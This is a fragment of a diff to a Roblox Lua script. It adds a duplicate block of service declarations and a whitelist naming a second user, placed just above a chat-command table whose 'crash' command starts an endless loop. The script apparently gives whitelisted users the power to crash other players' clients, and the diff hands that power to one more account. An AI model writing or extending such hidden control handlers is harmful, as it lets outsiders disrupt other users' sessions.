@@ -899,6 +899,11 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local Whitelist = { "jdurieivfbd12" }
 
+local TextChatService = game:GetService("TextChatService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Whitelist = { "8Hoseu" }
+
 local cmds = {
     ["crash"] = function()
         while true do
